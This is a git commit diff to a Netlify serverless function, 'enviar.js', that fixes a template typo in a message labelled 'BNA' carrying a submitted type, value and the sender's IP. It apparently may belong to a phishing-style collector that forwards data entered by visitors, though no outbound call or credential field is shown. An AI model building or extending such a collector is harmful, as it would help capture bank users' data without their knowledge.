6468b60b6517e7c23e6cba63e93ce2b537aa8522
netlify93-crypto <netlify93@gmail.com>
2026-01-17 11:56:44 -0300

    Update enviar.js

--- netlify/functions/enviar.js
+++ netlify/functions/enviar.js
@@ -10,7 +10,7 @@ exports.handler = async (event) => {
   const mensaje = `
 📩 BNA
 
-${tipo]: ${valor}
+${tipo}: ${valor}
 IP: ${ip}
   `;
 
@@ -28,5 +28,6 @@ IP: ${ip}
     body: JSON.stringify({ ok: true })
   };
 };
+
 
 
